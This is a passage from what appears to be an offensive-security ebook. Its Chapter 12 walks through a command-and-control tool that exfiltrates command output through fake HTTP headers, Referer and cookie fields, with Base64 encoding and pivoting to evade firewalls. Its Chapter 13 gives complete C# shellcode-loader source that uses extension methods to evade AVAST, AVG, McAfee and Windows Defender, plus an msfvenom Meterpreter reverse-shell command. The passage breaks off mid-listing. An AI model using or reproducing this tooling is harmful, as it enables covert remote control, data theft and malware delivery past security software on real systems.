-b \"viewtype=Default; UniqueIDs=uids=$bytes&amp;$_Random2\" \n\r\n\rso again like previous technique we have some steps like these:\n\r\n\r\n\r\n\rstep0: script3.sh executed\n\r\n\rstep1: Client detected by server with IPv4 192.168.56.102\n\r\n\rstep2: with command “@ 192.168.56.102” you can have interaction with client.\n\r\n\rstep3: in this time by this command “@fhn” or “@fheaderon” you will have Fake-Header with “setting:on”. \n\r\n\rstep4: by this command “@xcn” or “@xcookieon” you will have Payload Injection via “cookie” HTTP Header Field.\n\r\n\rNote: before using “@xcn” you should use “@fhn” command to enable Fake-Header always and with “@fhf” you can disable Fake-Header configuration also with “@xcf” or “@xcookieoff” you can disable “@xcn” command too.\n\r\n\rstep5: now you can enter your command to execute in client-side. as you can see in the “Picture 10” I used this command “echo this is test 3 ;)” \n\r\n\rstep6: press enter to continue…. (client-side).\n\r\n\rstep7: you will see command output (server-side). \n\r\n\r\n\r\n\ras you can see in the next “Picture 11”  we have injected payload as cookie values into Apache log file.\n\r\n\rPicture 11: Script3.sh and command output.  \n\r\n\r\n\r\n\rSo by these simple “Script.sh” codes and Pictures you can see: what exactly happened behind my Code ”NativePayload_HTTP.sh” in server-side and especially (client-side). As I mentioned in this chapter my focus was on HTTP Traffic and HTTP Packets and my focus was not on Web Programming but Web programming is next step to these techniques also is very important so you should rethink about that also rethink about (legal/illegal) Web Application traffic/behavior for bypassing “hardware firewalls” or “host-based firewalls”.\n\r\n\r\n\r\n\r\n\r\n\rUsing NativePayload_HTTP tool step by step:\n\r\n\r\n\r\n\rin this time we should talk about this “NativePayload_HTTP “ code with more detail step by step in client-side and server-side.\n\r\n\r\n\r\n\rthis is first step to use code (@help) with this syntax you can have help for this tool:\n\r\n\r\n\r\n\rsyntax: ./NativePayload_HTTP.sh help\n\r\n\rPicture 12: Help for internal commands \n\r\n\rin server-side you should use this syntax : ./NativePayload_HTTP.sh -exfilwebserver 80\n\r\n\rby default my code will work with apache2 in port.[80] only so you can use this syntax without t“80”\n\r\n\r./NativePayload_HTTP.sh -exfilwebserver\n\r\n\rPicture 13: NativePayload_HTTP.sh -exfilwebserver 80 \n\r\n\rClient Detection: \n\r\n\ras you can see in next “Picture 14”, client with IPv4 192.168.56.102 Detected by server and in client-side we have this syntax:\n\r\n\r\n\r\n\rClient-Side syntax:\n\r\n\rWindows: \n\r\n\rNativePayload_HTTP.exe -dumpcmd [Server-IPv4] [Server-Port]\n\r\n\rNativePayload_HTTP.exe -dumpcmd  192.168.56.1  80\n\r\n\rLinux: \n\r\n\rNativePayload_HTTP.sh -dumpcmd [Server-IPv4] [Server-Port] [Internal-delay sec]\n\r\n\rNativePayload_HTTP.sh -dumpcmd  192.168.56.1  80  0.3\n\r\n\rPicture 14: NativePayload_HTTP.sh and client-side \n\r\n\r\n\r\n\ras you can see in this “Picture 14” , Client Detected by sever after received first signal from Client .\n\r\n\r \n\r\n\r\n\r\n\rnow with command “@interaction [IPv4-Client]” or “@  [IPv4-Client]” you can have interact to client like “Picture 15”, finally you can set a command for client side as you can see in “Picture 15” I used this command “echo Hi ;D”.\n\r\n\rPicture 16: NativePayload_HTTP.sh and client-side \n\r\n\r\n\r\n\ras you can see in “Picture 16”  after 25 sec we have Client-side Command output in Server-side.\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\rAs you can see in the next “Picture 17” in apache log file we have Payloads with detail information:\n\r\n\rPicture 17: NativePayload_HTTP.sh and client-side. \n\r\n\r\n\r\n\ralso with this command you can see, how these Payloads Detected by my code in server-side very simple.\n\r\n\rPicture 18: NativePayload_HTTP.sh and client-side. \n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\rClient-side Commands with Base64 Encoding: \n\r\n\rif you want to make one layer of security to your payloads (without using HTTPS traffic), you can use Encryption or something like that in this case Base64 for payloads to avoid Payload Detection by Firewalls or Monitoring Tools on HTTP Network Traffic.\n\r\n\rPicture 19: NativePayload_HTTP.sh and client-side with base64 encoding \n\r\n\rin this case you can use this commands “@64on” or “@base64on” to enable BASE64 encoding for payloads also with these command you can disable them “@64off” or “@base64off”.\n\r\n\rPicture 20: NativePayload_HTTP.sh and client-side with base64 encoding \n\r\n\ras you can see in this “Picture 20” that payload detected by base64 encoding in Apache log file simply.\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\rHTTP Fake-Headers and Commands:\n\r\n\ras I mentioned in this chapter my focus is on HTTP Packets so let me talk about HTTP Headers by commands in my code.\n\r\n\rBefore begin we need to Packet Monitoring by Wireshark or tcpdump so first step is this command .\n\r\n\r\n\r\n\rtcpdump -i vboxnet0 -s 0 -w MonitorPackets.trace\n\r\n\rPicture 21: NativePayload_HTTP.sh and Fake-Headers \n\r\n\r\n\r\n\rnow with this command you can set Fake-Header:On , “@fhn” or “@fheaderon” as you can see in “Picture 22” also with command “@info” you can see all server configurations which will apply to your client.  \n\r\n\rPicture 22: NativePayload_HTTP.sh and Fake-Headers \n\r\n\r\n\r\n\rin the next “Picture 23” you can see this command “echo test 3 ;)” executed by Fake-Header in client-side. \n\r\n\r\n\r\n\ras you can see in this “Picture 24” we have New User-agent things in HTTP Header which means this Packet Sent by “Firefox 50 , from Linux system ” but this is “Fake User-agent” (we knew this was windows system also packet sent by C# Codes) so it is simple way to make Fake-Header in HTTP Traffic.\n\r\n\rPicture 24: NativePayload_HTTP.sh and Fake-Headers \n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\rlet me show you some more detail about HTTP Packets by next “Picture 25” , with this Command you can Watch Packets for this last Command which executed in Client-side (for more information: “Picture 21”).\n\r\n\rPicture 25: Monitoring Packets \n\r\n\r\n\r\n\rnow by Wireshark you can see what exactly happened in HTTP Header by command “@fhn”.\n\r\n\rPicture 26: Monitoring Packets \n\r\n\ras you can see we have this “User-agent” in HTTP Header which sent from client to server , in the next “Picture 27” I used “@fhf” to “disable Fake-Header” and again I sent this command “echo test 4”  to client .Picture 27: NativePayload_HTTP.sh and “@fhf” Fake-Headers:off \n\r\n\ras you can see in the next “Picture 28” in HTTP Packets we have this Header when our “Fake-Header setting is off”.\n\r\n\r \n\r\n\r\n\r\n\rnow you can compare this “Picture 28” with “Picture 26” and you will see what is different between these HTTP header Packets.\n\r\n\rin the next “Picture 29” you can see I used Command “@cmdlist” which with this command you can see all Executed Commands in Client-side also you can see with command “@cmdsave” you can save this Report to text file.\n\r\n\rPicture 29: NativePayload_HTTP.sh and List of commands by “@cmdlist” and saving Commands by “@cmdsave”  \n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\rPayload injection via “Referer” field in HTTP Headers and Commands:\n\r\n\rAs I mentioned in this chapter we can use “Referer” HTTP Header field as Payload for send Data to server. With this simple command  “@xrn” or “@xrefon” you can do this by this tool also with “@xrf” or “@xrefoff” you can disable this setting too.\n\r\n\r\n\r\n\rNote: before command “@xrn” you should first use “@fhn” to enable Fake-Header. \n\r\n\rPicture 30: NativePayload_HTTP.sh and Payloads injection via Referer \n\r\n\r\n\r\n\ras you can see in this “Picture 30” I used these commands and “step 2” is “optional” always:\n\r\n\r\n\r\n\rstep1: @  192.168.56.102      interact to client with ipv4 192.168.56.102\n\r\n\rstep2: @64on                         setting on Base64 for payloads (optional)\n\r\n\rstep3: @fhn                            setting on Fake-Headers\n\r\n\rstep4: @xrn                            setting on payloads injection via “Referer”\n\r\n\rstep5: echo test 6 ;)               setting command for client-side\n\r\n\r\n\r\n\rfinally you can see we have command output in server-side and these payload sent by client to server via “referer” HTTP Header field.\n\r\n\r \n\r\n\rPicture 31: NativePayload_HTTP.sh and Payloads injection via Referer\n\r\n\r\n\r\n\ras you can see in “Picture 31” these payload injected to HTTP Header via “Referer” field and you can see these payload in apache log file. In then next Picture you can see what happened in HTTP Header by wireshark.\n\r\n\r \n\r\n\rPicture 32: Network traffic and Payloads injection via Referer\n\r\n\ras you can see in “Picture 32” these payload injected to HTTP Header via “Referer” field.\n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\r\n\r\n\r \n\r\n\rPayload injection via “cookie” field in HTTP Headers and Commands:\n\r\n\rAs I mentioned in this chapter we can use “cookie” HTTP Header field as Payload for send Data to server. With this simple command  “@xcn” or “@xcookieon” you can do this by this tool also with “@xcf” or “@xcookieoff” you can disable this setting too.\n\r\n\r\n\r\n\rNote: before command “@xcn” you should first use “@fhn” to enable Fake-Header. \n\r\n\r Picture 33: Network traffic and Payloads injection via cookie \n\r\n\ras you can see in the next “Picture 34” our Command output sent via Cookie by HTTP Traffic and these payloads are in apache log file.\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r \n\r\n\rPicture 34: Apache log file and Payloads injection via cookie\n\r\n\ralso in the next “Picture 35” you can see our payloads injected cookie value by wireshark.\n\r\n\r Picture 35: wireshark and Payloads injection via cookie \n\r\n\r\n\r\n\r\n\r\n\rNote: this chapter-12 has two parts, to continue please read “Part2 of Chapter 12”.","","topics\\Chapter 12 - Part 1.html","\n\r\n\rSimple way for Data Exfiltration via HTTP Traffic (PART2)\n\r\n\r\n\r\n\rSetting Delay by Server:\n\r\n\ras you can see in “Picture 1”, client sent Signal to Server by Random Delays, it means your clients have not same behavior to “re-send” signals to server, for example in this case our client had these delays (51859=51 sec, 29811=29 sec and 46159=46 sec). But you can change this delay from “Random” Number to your “Static” Number, as you can see in this “Picture 1” by command “@delay 5” you can set this Delay in client-side to (5 sec) very simple also you can disable this Delay by this command “@delay off”. always you can see delay information for each client by this command “@info”\n\r\n\r\n\r\n\r \n\r\n\rPicture 1: setting Delay to clients\n\r\n\r\n\r\n\rHelp command:\n\r\n\ryou can see help for “internal” commands by type “@help” command. \n\r\n\r \n\r\n\rPicture 2: NativePayload_HTTP.sh help command\n\r\n\rInteracting to multiple clients and commands:\n\r\n\r\n\r\n\rin this time I want to talk about working with multiple clients , as you can in “Picture 3” I had two clients with “IPv4 102 and 103” and both detected by server .in the next “Picture 4”  you can see how can interact with them .\n\r\n\rPicture 3: NativePayload_HTTP.sh and interacting with multiple clients \n\r\n\r\n\r\n\ras I mentioned in “Part1” of this “chapter 12” you can use command “@clients” or “@cli” to show list of clients also you can use “@interact Client-IPv4” or “@ Client-IPv4” to interact to Clients by IPv4 address.\n\r\n\r \n\r\n\rPicture 4: NativePayload_HTTP.sh and interacting with multiple clients\n\r\n\ras you can see in “Picture 5”, I used “@back” command then I used “@ 192.168.56.103” to interact to second Client but you can do this without “@back” command too, it means you can use directly “@interact IPv4” or “@ IPv4” command always.\n\r\n\rPicture 5: NativePayload_HTTP.sh and interacting with multiple clients \n\r\n\r\n\r\n\rDelays and Multiple Clients:\n\r\n\ryou can use “@delay x” command for each client separately. In the next “Pictures 6 and 7” you can see how can do this.  \n\r\n\r \n\r\n\rPicture 6: NativePayload_HTTP.sh and delay for multiple clients\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r \n\r\n\rPicture 7: NativePayload_HTTP.sh and delay for multiple clients\n\r\n\r\n\r\n\ralso with “@info” command you can see “activated delays” for each client. \n\r\n\r \n\r\n\rPicture 8: “@info” command and delay for multiple clients\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\rExit Command for Exit Client-side tool (agent):\n\r\n\r\n\r\n\rwith “exit” command without “@” your client-side agent will exit , as you can see in “Picture 9”.\n\r\n\rNote: with command “@exit” your server-side tool will exit.\n\r\n\r \n\r\n\rPicture 9: “exit” command \n\r\n\r\n\r\n\rPivoting,(Dumping commands output from (Pivot client) to server by (intermediate system) via indirect traffic):\n\r\n\r\n\r\n\rPivoting Method step by step:\n\r\n\r\n\r\n\rstep1: Pivot-client executed [ ./NativePayload_HTTP.sh -dumpcmd pivotclient ]\n\r\n\rstep2: Intermediate-system executed (client) [ ./NativePayload_HTTP.sh -dumpcmd 192.168.56.1 80 0.5 ] \n\r\n\rstep3: Server executed [ ./NativePayload_HTTP.sh -exfilwebserver 80 ] \n\r\n\rstep4: intermediate system ---&gt; download Pivot-client IPv4 &amp; command from server   &gt;&gt;&gt;  server 192.168.56.1:80\n\r\n\rstep5: intermediate system ---&gt; send signal: i am your intermediate system &amp; your cmd is [????] &gt;&gt;&gt;  Pivot-client:8080\n\r\n\rstep6: Pivot-client system ---&gt; sned cmd output to intermediate system  &gt;&gt;&gt; intermediate-system:8081\n\r\n\rstep7: intermediate-system ---&gt; send cmd output for Pivot-client to server &gt;&gt;&gt; server:80\n\r\n\r\n\r\n\rso we have something like this: server &lt;&lt;----- intermediate &lt;&lt;-----&gt;&gt; Pivot-client\n\r\n\r\n\r\n\ras you can see Pivot-client will send CMD output to Intermediate-system so our server will not dump CMD output from Pivot-client directly, so it will be indirect exfiltration. \n\r\n\r\n\r\n\rNote: my C# code does not support this feature (unfortunately) so it means you can use this feature only by two linux systems.\n\r\n\rNote: as you can see in the next Pictures with this command “@piv” you can use this feature.\n\r\n\rNote: for this feature I used “python SimpleHTTPServer “ and my code has “bug” unfortunately, sometimes doesn’t works very well I will fix this in next version by migration from “python” to “apache2” ;). \n\r\n\r \n\r\n\rPicture 10: “@piv” command \n\r\n\r\n\r\n\r  \n\r\n\rPicture 11: “@piv” command\n\r\n\r \n\r\n\r  \n\r\n\rPicture 12: “@piv” command and “@cmdlist”\n\r\n\r ","","topics\\Chapter 12 - Part 2.html","\n\r\n\rChapter 13 : C# e[X]tension Method and bypassing Anti-viruses\n\r\n\r\n\rGoal : How can Make New Code/Signature for old-codes by “X” Technique \n\r\n\r\n\rC#.NET Code and Testing. \n\r\n\r\n\rVideo \n\r\n\r\n\r \n\r\n\rBypassing Anti-viruses and C# e[X]tension Technique\n\r\n\r \n\r\n\rIn this article I want to talk about Simple useful technique called e[X]tension Technique in C# \n\r\n\rWith this Simple Technique you will have New Code and New Signature for your old code (which perhaps will detect by Some Anti-viruses signature-based Avs).\n\r\n\rThe Idea for this Method is Simple also is Useful sometimes if you have Some Codes which Was detected by Anti-viruses then this Technique will help you to use them (Old Codes) with New Signature and New Codes …\n\r\n\rfor example we have this (Old code) which detected by some anti-viruses as Malware code\n\r\n\rwith this simple code you can run “Meterpreter” Payload in Memory with new Thread in your Current Process…\n\r\n\r \n\r\n\r1.  UInt32 funcAddr = VirtualAlloc(0x00000000, (UInt32)payload.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\r\n\r2.  Marshal.Copy(payload, 0x00000000, (IntPtr)(funcAddr), payload.Length);\n\r\n\r3.  IntPtr hThread = IntPtr.Zero;\n\r\n\r4.  UInt32 threadId = 0;\n\r\n\r5.  IntPtr pinfo = IntPtr.Zero;\n\r\n\r6.  hThread = CreateThread(0x0000, 0x0000, funcAddr, pinfo, 0x0000, ref threadId);\n\r\n\r7.  WaitForSingleObject(hThread, 0xffffffff);\n\r\n\r \n\r\n\rImportant Points :\n\r\n\r\n\r1.Where of your Code is Sensitive and probably will Detect by Anti-Viruses ? \n\r\n\r\n\r \n\r\n\r            \n\r\n\r            UInt32 MEM_COMMIT = 0x1000;\n\r\n\r            UInt32 PAGE_EXECUTE_READWRITE = 0x40;\n\r\n\r          \n\r\n\r  S1      UInt32 funcAddr = VirtualAlloc(0x0000, (UInt32)X_Final.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\r\n\r            Marshal.Copy(X_Final, 0x0000, (IntPtr)(funcAddr), X_Final.Length);\n\r\n\r            IntPtr hThread = IntPtr.Zero;\n\r\n\r            UInt32 threadId = 0x0000;\n\r\n\r            IntPtr pinfo = IntPtr.Zero;\n\r\n\r   S2     hThread = CreateThread(0x0000, 0x0000, funcAddr, pinfo, 0x0000, ref threadId);\n\r\n\r            WaitForSingleObject(hThread, 0xffffffff);\n\r\n\r            \n\r\n\r \n\r\n\r\n\r2.Some Anti-viruses will Detect Sections S1 , S2 so in this case you should change your C# Source Code to Make New Signature. \n\r\n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\rsome Anti-viruses will detect these codes if you want to use them in your own code it means lines (1, 2, 6, 7) are “important” for some Anti-viruses like “AVAST” etc. so they made Signature for this code in their AV Database &amp; will detect this code as Malware code.\n\r\n\rNote: if in your code you have/had just lines (1 &amp; 2) does not matter for Anti-viruses but if you have lines (1 &amp; 2 up to 6 &amp; 7) then your code perhaps have same signature with some Malware and will detect by Avs. \n\r\n\rThese API functions  (VirtualAlloc , CreatThread &amp; WaitForSingleObject) + Marshal.copy in C# are used by some Virus/Malware Codes so this code 100% will detect by some Anti-viruses.\n\r\n\rSome Anti-viruses will detect these Lines in your “code/exe” only but some Anti-viruses will not detect these lines in your source code and they will “scan” New Thread in Memory (ESET, Kaspersky, ...) then if your New Thread Payload was a Malware Code your Process will Detect by these Avs. In this case our New Thread Payload is Meterpreter Payload so this will Detect more often by (ESET, …).\n\r\n\rin this “X” Technique our Goal is to show how can Bypass those Anti-viruses which just their focus is on line (1 up to 7) So in this Simple “X” Technique we should think about these lines 1 up to 7.\n\r\n\rwe should think about this how can use these 7 lines with New Structure or with New Code?\n\r\n\rIn the “Picture 1” you can see we have two Codes (Old,New) &amp; “old code” detected by some Anti-viruses like AVAST but “New code” NOT. Important thing is both codes have same result but they have different signature also in both codes these API functions called but with different way...\n\r\n\r  \n\r\n\rPicture 1: Old Code &amp; New Code (X technique)\n\r\n\r \n\r\n\rin this New Code as you can see Some lines changed:\n\r\n\r1. UInt32 funcAddr = VirtualAlloc(0x00000000, (UInt32)payload.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\r\n\rchanged to \n\r\n\r                UInt32 funcAddr2 = 1;\n\r\n\r                UInt32 funcAddr1 = funcAddr2.VA(p);\n\r\n\r2. Marshal.Copy(payload, 0x00000000, (IntPtr)(funcAddr), payload.Length);\n\r\n\rchanged to  \n\r\n\r                Convert.ToUInt32(\"2\").CPY(p, (IntPtr)(funcAddr1));\n\r\n\r6. hThread = CreateThread(0x0000, 0x0000, funcAddr, pinfo, 0x0000, ref threadId);\n\r\n\r7. WaitForSingleObject(hThread, 0xffffffff);\n\r\n\rchanged to \n\r\n\r                funcAddr2.WSO(Convert.ToUInt32(\"3\").CT(funcAddr1, pin, tId));\n\r\n\r \n\r\n\rC# and e[X]tension Technique step by step:\n\r\n\rMicrosoft explained C# “Extension Method” by something like this: \n\r\n\r“Extension methods enable you to [add] methods to existing types without creating a new derived type, recompiling, or otherwise modifying the original type. Extension methods are a [special kind of static method], but they are called as if they were instance methods on the extended type. For client code written in C#, F# and Visual Basic, there is no apparent difference between calling an extension method and the methods that are actually defined in a type. In your code you [invoke] the extension method with instance method syntax. However, the intermediate language (IL) generated by the compiler translates your code into a [call] on the static method. Therefore, the principle of encapsulation is not really being violated.”\n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\rBut the Important thing is with this “X” Technique you have New forms of Code (old code) so let me talk about this by simple example:\n\r\n\rOld code:\n\r\n\r        1. string s = “”;\n\r\n\r        2. s = “Bingo”; \n\r\n\r        Now your s == “Bingo”\n\r\n\rNew code:\n\r\n\r        1. public static class ClassName \n\r\n\r        2. {        \n\r\n\r        3. public static string DoSomething(this string str) { return “Bingo”;  }\n\r\n\r        4. }\n\r\n\r        5. string s = “asdfghjkerwrtuiopqwertyuiopasdfghjklzxcvbnm”;\n\r\n\r        6. s = s.DoSomething();\n\r\n\r        Now your s == “Bingo”\n\r\n\ras you can see both codes (Old,New) have same result but they are not same also their signatures are not same too.\n\r\n\rSo by this “X” technique you can change your Code/signature very simple and sometimes this is best way to bypass some Anti-viruses (signature-based).\n\r\n\rSo let me talk about ”X” Technique in our New Code step by step:\n\r\n\rin this step we need to change our code from line 1 to these two lines so our New Code by Extension Method should be something like this “Picture 2”\n\r\n\r1. UInt32 funcAddr = VirtualAlloc(0x00000000, (UInt32)payload.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\r\n\rchanged to \n\r\n\r                UInt32 funcAddr2 = 1;\n\r\n\r                UInt32 funcAddr1 = funcAddr2.VA(p);\n\r\n\rPicture 2: \n\r\n\rnow in the next step we need to change code line 2 to new code like “Picture 3”\n\r\n\r2. Marshal.Copy(payload, 0x00000000, (IntPtr)(funcAddr), payload.Length);\n\r\n\rchanged to  \n\r\n\r                Convert.ToUInt32(\"2\").CPY(p, (IntPtr)(funcAddr1));Picture 3:  \n\r\n\rand finally we need to change lines 6 and 7 to new line like “Picture 4”\n\r\n\r6. hThread = CreateThread(0x0000, 0x0000, funcAddr, pinfo, 0x0000, ref threadId);\n\r\n\r7. WaitForSingleObject(hThread, 0xffffffff);\n\r\n\rchanged to \n\r\n\r                funcAddr2.WSO(Convert.ToUInt32(\"3\").CT(funcAddr1, pin, tId));Picture 4: \n\r\n\rin the next “Picture 5” you can see these New Codes in one ClassPicture 5: \n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\rafter these steps you can see in the “Picture 6” we have same result but these codes are not exactly same also with this e[X]tension Technique Signatures for Old code &amp; New code are not same too.Picture 6: old code and new code \n\r\n\r“Important” thing about SOME Signature-based Anti-viruses is: in this case some anti-viruses will detect your code if your code is/was something like this “old code”\n\r\n\rAs you can see in the “picture 6” in right-side (old-code) we have 4 “Important lines”, these four lines are (line numbers: 34, 35 &amp; 41, 42), some anti-viruses like “AVAST” detected these section of code only (Picture 7).\n\r\n\rwith this “X” Technique we have something like chunked codes from one code (old-code) to 3 different sections code (new-code) by e[X]tension Methods so with this simple Technique we have New signature but New Code has same result like Old code…\n\r\n\rNote: with this Technique we don’t have these codes continuously (line numbers 34, 35 up to 41, 42) and some of Anti-viruses (AVAST) bypassed by this Simple Technique.\n\r\n\rI tested this X technique by this simple code “NativePayload_Reverse_tcpx.cs” for some anti-viruses like AVAST, AVG, McAfee, Windows Defender &amp; ... my Research results was good and this code worked for these Anti-viruses and Not detected by them as you can see Old-Code Detected by AVAST as “IDP.ALEXA.51” but New-Code Not detected by AVAST &amp; worked very well.\n\r\n\rNote: my payload for these tests was “x64/meterpreter/reverse_tcp”\n\r\n\rmsfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 -f c\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\ras you can see in the “Picture 7” old-code Detected by AVAST but in “Picture 8” you can see new-code worked and Not Detected by AVAST.Picture 7: Old-Code Detected by AVAST. Picture 8: AVAST bypassed by New-Code &amp; “X Technique”. \n\r\n\rIn the next “Picture 9” you can see my result for Windows Defender and this anti-virus bypassed simply.Picture 9: This “X” Technique Not Detected by Windows Defender.  \n\r\n\rI tested this Code for bypassing AVG and this code worked very well. \n\r\n\rPicture 10: AVG Bypassed.\n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\ras you can see in the next picture I had a shell after injection from NativePayload_Reverse_tcpx.exe into Explorer.exePicture 11: AVG Bypassed. \n\r\n\ralso I tested this code for McAfee &amp; this code worked very well. \n\r\n\rPicture 12: McAfee Bypassed.\n\r\n\rNote: in this chapter I do not want to teach C# e[X]tension Method programming or something like that but something you should know about this “X” Technique:\n\r\n\r \n\r\n\ras Microsoft said: Extension methods enable you to \"add\" methods to existing types without creating a new derived type, recompiling, or otherwise modifying the original type. \n\r\n\rfor Extension method in C# you need New Method somewhere for example in new static Class “test” and Extension Method always has “this”.\n\r\n\rlet me explain this by one example :\n\r\n\r \n\r\n\r public static UInt32 VA(this UInt32 a, byte[] pp)\n\r\n\r        {\n\r\n\r            System.Threading.Thread.Sleep(10000);\n\r\n\r            UInt32 f = VirtualAlloc(0, (UInt32)pp.Length, m, d);\n\r\n\r            System.Threading.Thread.Sleep(10000);\n\r\n\r \n\r\n\r            return f;\n\r\n\r        }\n\r\n\r \n\r\n\ras you can see we have “this” + Uint32 type, it means your extension method “VA” is for “Uint32” type.\n\r\n\r \n\r\n\rat a glance : this Technique is very simple also is useful for bypassing SOME Anti-viruses, with this technique you can change your code by simple Extension Methods. \n\r\n\r\n\r\n\rNativePayload_Reverse_tcpx.cs\n\r\n\rusing System;\n\r\n\rusing System.Collections.Generic;\n\r\n\rusing System.Linq;\n\r\n\rusing System.Runtime.InteropServices;\n\r\n\rusing System.Text;\n\r\n\r \n\r\n\rnamespace NativePayload_Reverse_tcpx\n\r\n\r{\n\r\n\r    public static class test\n\r\n\r    {\n\r\n\r        [DllImport(\"kernel32\")]\n\r\n\r        public static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);     \n\r\n\r        [DllImport(\"kernel32\")]\n\r\n\r        public static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);      \n\r\n\r        [DllImport(\"kernel32\")]\n\r\n\r        public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);\n\r\n\r \n\r\n\r        public static UInt32 m = 0x1000;\n\r\n\r        public static UInt32 d = 0x40;\n\r\n\r        public static UInt32 VA(this UInt32 a, byte[] pp)\n\r\n\r        {\n\r\n\r            System.Threading.Thread.Sleep(10000);\n\r\n\r            UInt32 f = VirtualAlloc(0, (UInt32)pp.Length, m, d);\n\r\n\r            System.Threading.Thread.Sleep(10000);\n\r\n\r \n\r\n\r            return f;\n\r\n\r        }\n\r\n\r        public static void CPY(this UInt32 b, byte[] src, IntPtr des)\n\r\n\r        {\n\r\n\r            System.Threading.Thread.Sleep(5000);\n\r\n\r            Marshal.Copy(src, 0, (IntPtr)(des), src.Length);\n\r\n\r        }\n\r\n\r        public static IntPtr CT(this UInt32 c, UInt32 stadd, IntPtr x, UInt32 r)\n\r\n\r        {\n\r\n\r            IntPtr hThread = CreateThread(0, 0, stadd, x, 0, ref r);\n\r\n\r            System.Threading.Thread.Sleep(3000);\n\r\n\r            return hThread;\n\r\n\r        }\n\r\n\r        public static uint WSO(this UInt32 d, IntPtr hn)\n\r\n\r        {\n\r\n\r            System.Threading.Thread.Sleep(5000);\n\r\n\r            return WaitForSingleObject(hn, 0xFFFFFFFF);\n\r\n\r        }\n\r\n\r    }\n\r\n\r    class Program\n\r\n\r    {\n\r\n\r        static void Main(string[] args)\n\r\n\r        {\n\r\n\r            Console.WriteLine();\n\r\n\r            Console.ForegroundColor = ConsoleColor.DarkGray;\n\r\n\r            Console.WriteLine(\"NativePayload_Reverse_tcpx , Published by Damon Mohammadbagher , Feb 2020\");\n\r\n\r            Console.WriteLine();\n\r\n\r            Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r \n\r\n\r            try\n\r\n\r            {\n\r\n\r                string[] pay1 = args[0].ToString().Split(\',\');\n\r\n\r                \n\r\n\r                byte[] p = new byte[pay1.Length];\n\r\n\r                for (int i = 0; i &lt; pay1.Length; i++)\n\r\n\r                {  p[i] = Convert.ToByte( pay1[i],16 ); }\n\r\n\r \n\r\n\r                UInt32 funcAddr2 = 1;\n\r\n\r                UInt32 funcAddr1 = funcAddr2.VA(p);\n\r\n\r \n\r\n\r                System.Threading.Thread.Sleep(5000);\n\r\n\r                Convert.ToUInt32(\"2\").CPY(p, (IntPtr)(funcAddr1));\n\r\n\r                System.Threading.Thread.Sleep(5000);\n\r\n\r                UInt32 tId = 0;\n\r\n\r                System.Threading.Thread.Sleep(5000);\n\r\n\r                IntPtr pin = IntPtr.Zero;\n\r\n\r               \n\r\n\r                System.Threading.Thread.Sleep(5000);\n\r\n\r                Console.WriteLine(\"Bingo: X Meterpreter session by msfvenom Payload ;)\");\n\r\n\r                funcAddr2.WSO(Convert.ToUInt32(\"3\").CT(funcAddr1, pin, tId));\n\r\n\r                System.Threading.Thread.Sleep(5000);\n\r\n\r            }\n\r\n\r            catch (Exception echo)\n\r\n\r            {\n\r\n\r                Console.WriteLine(echo.Message);\n\r\n\r            }\n\r\n\r \n\r\n\r        }\n\r\n\r    }\n\r\n\r}\n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\rNativePayload_SimpleReverse_tcp.cs\n\r\n\rusing System;\n\r\n\rusing System.Collections.Generic;\n\r\n\rusing System.Linq;\n\r\n\rusing System.Runtime.InteropServices;\n\r\n\rusing System.Text;\n\r\n\r \n\r\n\rnamespace NativePayload_SimpleReverse_tcp\n\r\n\r{\n\r\n\r    class Program\n\r\n\r    {      \n\r\n\r        static void Main(string[] args)\n\r\n\r        {\n\r\n\r            Console.WriteLine();\n\r\n\r            Console.ForegroundColor = ConsoleColor.DarkGray;\n\r\n\r            Console.WriteLine(\"NativePayload_SimpleReverse_tcp , Published by Damon Mohammadbagher , 2016\");\n\r\n\r            Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r            Console.WriteLine(\"NativePayload_SimpleReverse_tcp Simple Meterpreter Payload \");\n\r\n\r            Console.WriteLine();\n\r\n\r            \n\r\n\r            string X = args[0];\n\r\n\r            string[] XX = X.Split(\',\');\n\r\n\r            byte[] result__payload = new byte[XX.Length];\n\r\n\r            for (int i = 0; i &lt; XX.Length; i++)\n\r\n\r            {\n\r\n\r                result__payload[i] = Convert.ToByte(XX[i], 16);\n\r\n\r            }\n\r\n\r            UInt32 MEM_COMMIT = 0x1000;\n\r\n\r            UInt32 PAGE_EXECUTE_READWRITE = 